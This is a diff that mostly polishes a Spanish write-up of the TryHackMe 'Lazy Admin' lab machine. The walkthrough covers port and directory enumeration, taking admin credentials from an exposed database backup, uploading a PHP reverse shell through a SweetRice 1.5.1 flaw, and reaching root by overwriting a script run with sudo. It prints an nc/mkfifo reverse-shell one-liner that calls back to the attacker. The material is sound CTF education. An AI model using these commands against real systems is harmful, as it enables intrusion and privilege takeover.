@@ -1,12 +1,10 @@
 # Lazy Admin WriteUp
 ### Español & English
 
-
-
 ## Enumeración
 
 #### :ship: Nmap - Enumeración de puertos
-Para la enumeración de puertos de la máquina utilizaremos nmap, una herramienta que nos permite scanear los puertos abiertos y los servicios que corren en una dirección IP. Comenzaremos con enumerar los primeros 1000 puertos con el siguiente comando:
+Para la enumeración de puertos de la máquina utilizaremos `nmap`, una herramienta que nos permite scanear los puertos abiertos y los servicios que corren en una dirección IP. Comenzaremos con enumerar los primeros 1000 puertos con el siguiente comando:
 
 ```console
 kimera@vault:~/Machines/THM/LazyAdmin/nmap$ nmap -n -T4 -p 1-1000 10.10.109.87 -oN portenum
@@ -20,8 +18,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-Con `-n` especificamos que no se realice nunca la resolución de DNS lo que agiliza el proceso de escaneo, con `-T4` especificamos el nivel de agresividad y evitamos que el tiempo de expiración de los sondeos en los puertos TCP no excedan de 10ms. Por útltimo guardamos los resultados en el archivo `portenum` en formato nmap con el argumento `-oN`.
-
+Con `-n` especificamos que no se realice nunca la resolución de DNS lo que agiliza el proceso de escaneo, con `-T4` especificamos el nivel de agresividad y evitamos que el tiempo de expiración de los sondeos en los puertos TCP no excedan de 10ms. Por último guardamos los resultados en el archivo `portenum` en formato nmap con el argumento `-oN`.
 
 Ahora procedemos con la enumeración de los servicios y sus versiones de cada uno de los puertos abiertos que previamente habiamos encontrado:
 
@@ -49,13 +46,13 @@ Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
 
 #### :page_with_curl: Wfuzz - Enumeración de directorios
 
-Como podemos observar existe un servicio http por el puerto 80 al que podemos acceder con la URL `http://10.10.109.87:80`en nuestro navegador:
+Como podemos observar existe un servicio HTTP por el puerto 80 al que podemos acceder con la URL `http://10.10.109.87:80` en nuestro navegador:
 
 ![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/index.png)
 
 Accedemos a la página de defecto del servidor Apache2.
 
-En este punto comencé a buscar archivos `robots.txt`, `login.php`o directorios como `/uploads` que son bastante counes en los CTFs, pero no obtuve resultados.
+En este punto comencé a buscar archivos `robots.txt`, `login.php`o directorios como `/uploads` que son bastante comunes en los CTFs, pero no obtuve resultados.
 
 Para la enumeración de directorios utilizaremos wfuzz como herramienta de fuzzeo. Las wordlists que empleé fueron dos, con la primera (`/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`) no obtuve resultados ya sin especificar extensión o con las extensiones `php`y `html`. Con la segunda wordlist (`/usr/share/wfuzz/wordlist/general/common.txt`) si que salieron resultados:
 
@@ -107,7 +104,6 @@ Filtered Requests: 946
 Requests/sec.: 43.84869
 ```
 
-
 Primero revisamos la URL `http://10.10.109.87/content`, donde podemos deducir que se utiliza el gestor de contenido SweetRice:
 
 ![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/sweetrice.png)
@@ -115,23 +111,22 @@ Primero revisamos la URL `http://10.10.109.87/content`, donde podemos deducir qu
 Al inspeccionar la página podemos encontrar un link de un archivo escrito en JavaScript (`.js`) debajo del tag de <title>.
 Si nos fijamos en la ubicación del archivo podemos encontrarnos con el directorio que previamente habiamos fuzzeado.
   
-Revisando el archivo `SweetRice.js` se ve una versión desde el que se utiliza el script (`0.5.4`). Con la idea de encontrar credenciales, con el atajo `Ctrl+F`filtramos la palabra `pass` con la que se obtienen dos resultados, sin embargo no hay ninguna contraseña o usuario.
+Revisando el archivo `SweetRice.js` se ve una versión desde el que se utiliza el script (`0.5.4`). Con la idea de encontrar credenciales, con el atajo `Ctrl+F` filtramos la palabra `pass` con la que se obtienen dos resultados, sin embargo no hay ninguna contraseña o usuario.
 
-Si revisas cuidadosamente los demás scripts alojados en `http://10.10.109.87/content/js`puedes sacar también el directorio de `/images`.
-Mirando los archivos en `/images`no encontramos nada que nos revele datos que puedan vulnerar la máquina.
+Si revisas cuidadosamente los demás scripts alojados en `http://10.10.109.87/content/js` puedes sacar también el directorio de `/images`.
+Mirando los archivos en `/images` no encontramos nada que nos revele datos que puedan vulnerar la máquina.
 
 Por último, nos faltaría revisar el directorio `/inc` en el que encontremos diferentes carpetas y archivos en formato `.php`:
 
-
 ![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/inc.png)
 
-Si accedemos al archivo de texto con nombre `lastest.txt`podemos listar una versión, que como dice el nombre sería la más reciente de uno de los servicios que corre la página web. El servicio que habíamos encontrado previamente es el CMS SweetRice. Lo cual nos servirá mas adelante para buscar exploits relacionados con esta versión (`1.5.1`).
+Si accedemos al archivo de texto con nombre `lastest.txt` podemos listar una versión, que como dice el nombre sería la más reciente de uno de los servicios que corre la página web. El servicio que habíamos encontrado previamente es el CMS SweetRice. Lo cual nos servirá mas adelante para buscar exploits relacionados con esta versión (`1.5.1`).
 
 También podemos encontrar una carpeta con nombre `mysql_backup`, dentro de esa carpeta podemos descargar la copia de seguridad de una base de datos:
 
 ![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/mysql.png)
 
-Con el comando `strings`listamos todos los caracteres imprimibles del archivo:
+Con el comando `strings` listamos todos los caracteres imprimibles del archivo:
 
 ```console
 kimera@vault:~/Machines/THM/LazyAdmin/web$ strings mysql_bakup_20191129023059-1.5.1.sql 
@@ -139,14 +134,13 @@ kimera@vault:~/Machines/THM/LazyAdmin/web$ strings mysql_bakup_20191129023059-1.
 
 ![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/creds.png) 
 
-Si buscamos entre los resultados podemos encontrar una línea con el nombre de usuario de la cuenta admin (`manager`) y un hash md5 de la contraseña (`42f749ade7f9e195bf475f37a44cafcb`). El hash lo podemos decodificar [aquí](https://crackstation.net/).
+Si buscamos entre los resultados podemos encontrar una línea con el nombre de usuario de la cuenta admin (`manager`) y un hash md5 de la contraseña (`42f749ade7f9e195bf475f37a44cafcb`). El hash lo podemos desencriptar [aquí](https://crackstation.net/).
 
 ![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/hash.png)
 
 ## Exploitation
 
 #### :collision:Método - 1
-
 
 Como ya obtuvimos qué versión de SweetRice se está empleando podemos comprobar si ésta es vulnerable. Una simple búsqueda en Google nos dará varios resultados:
 
@@ -197,15 +191,11 @@ http://localhost/sweetrice/inc/ads/hacked.php
   -->
 ```
 
-Tal y como lo describe necesitamos tener acceso a una cuenta admin del CMS para luego acceder al panel de ads. Una vez ahí subir el codigo que nos dará una reverse shell sustituyendo `<?php echo '<h1> Hacked </h1>'; phpinfo();?>`por nuestro código. En mi caso utilicé `/usr/share/webshells/php/php-reverse-shell.php` cambiando los parámetros de la IP con mi dirección y el puerto por el 1234.
-
+Tal y como lo describe necesitamos tener acceso a una cuenta admin del CMS para luego acceder al panel de ads. Una vez ahí subir el código que nos dará una reverse shell sustituyendo `<?php echo '<h1> Hacked </h1>'; phpinfo();?>` por nuestro código. En mi caso utilicé `/usr/share/webshells/php/php-reverse-shell.php` cambiando los parámetros de la IP con mi dirección y el puerto por el 1234.
 
 ![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/exploit1.png)
 
-
 Una vez hayamos subido el archivo ponemos en escucha el puerto `1234` con netcat:
-
-
 
 ```console
 kimera@vault:~/Machines/THM/LazyAdmin/exploit$ nc -nlvp 1234
@@ -216,7 +206,7 @@ Y entramos en la URL donde se aloja el archivo que recién subimos: `http://10.1
 
 #### :collision:Método - 2
 
-Para este segundo método utilizaremos el primer enlace de la búsqueda que hicimos previamente. Este nos proprciona un exploit escrito en Python, el cual, cuando lo ejectutemos con el comando `python nombreexploit.py`, nos pedirá el host que en nuestro caso es `10.10.109.87/content`que nos lo pedirá entre comillas, así como el resto de parámetros necesarios: usuario, contraseña, nombre del archivo que queramos subir. En mi caso utilizaré de nuevo una reverse shell en php.
+Para este segundo método utilizaremos el primer enlace de la búsqueda que hicimos previamente. Este nos proporciona un exploit escrito en Python, el cual, cuando lo ejecutemos con el comando `python nombreexploit.py`, nos pedirá el host que en nuestro caso es `10.10.109.87/content` que nos lo pedirá entre comillas, así como el resto de parámetros necesarios: usuario, contraseña, nombre del archivo que queramos subir. En mi caso utilizaré de nuevo una reverse shell en PHP.
 
 Ponemos en escucha el puerto con el que configuramos la reverse shell y visitamos la URL que nos proporciona el output del exploit.
 
@@ -224,13 +214,11 @@ Ponemos en escucha el puerto con el que configuramos la reverse shell y visitamo
 
 #### :triangular_flag_on_post:Primera Flag
 
-
-Nos dirigimos al directorio home para ver a que carpeta de directorios de usuario tenemos acceso y vemos que la de itguy es accesible. Dentro de este usuario encontramos la primera flag:
+Nos dirigimos al directorio `/home/` para ver a qué carpeta de directorios de usuario tenemos acceso y vemos que la de `itguy` es accesible. Dentro de este usuario encontramos la primera flag:
 
 ![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/user.png)
 
-Con el comando `id`podemos ver que somos el usuario `www-data`. Para la escalación de privilegios procedemos con alguna enumeracón básica de linux. Con el comando `sudo -l`podemos ver que comandos podemos correr con permisos de root.
-
+Con el comando `id` podemos ver que somos el usuario `www-data`. Para la escalación de privilegios procedemos con alguna enumeración básica de Linux. Con el comando `sudo -l` podemos ver qué comandos podemos correr con permisos de root.
 
 ```console
 $ sudo -l
@@ -242,7 +230,7 @@ User www-data may run the following commands on THM-Chal:
     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
 
-Como podemos ver, el usuario www-data puede ejecutar un archivo escrito en perl. Para previsualizar el contenido de este archivo podemos hacer un cat:
+Como podemos ver, el usuario `www-data` puede ejecutar un archivo escrito en Perl. Para previsualizar el contenido de este archivo podemos hacer uso de `cat`:
 
 ```console
 $ cat /home/itguy/backup.pl
@@ -250,17 +238,16 @@ $ cat /home/itguy/backup.pl
 
 system("sh", "/etc/copy.sh");
 ```
-Al revisar el código vemos que edita otro archivo `sh`del directorio `etc`, el cual si revisamos los permisos con `ls -l /etc/copy.sh`tenemos permiso para escribir contenidos en él. Con el comando `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TU_IP 5757 >/tmp/f" > /etc/copy.sh`.
-Ahora ejecutamos el archivo en perl, no sin antes poner en escucha el puerto 5757:
+
+Al revisar el código vemos que edita otro archivo `sh` del directorio `etc`, el cual si revisamos los permisos con `ls -l /etc/copy.sh` tenemos permiso para escribir contenidos en él. Con el comando `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TU_IP 5757 >/tmp/f" > /etc/copy.sh`.
+Ahora ejecutamos el archivo en Perl, no sin antes poner en escucha el puerto 5757:
+
 ```console
 $ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
+
 #### :triangular_flag_on_post:Segunda Flag
 
-Si hacemos in id ya somos usuario root y ya podemos acceder al /root/root.txt:
+Si hacemos un `id` vemos que somos usuario root. Ahora ya podemos acceder al `/root/root.txt`:
 
 ![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/rootflag.png)
-
-
-
-
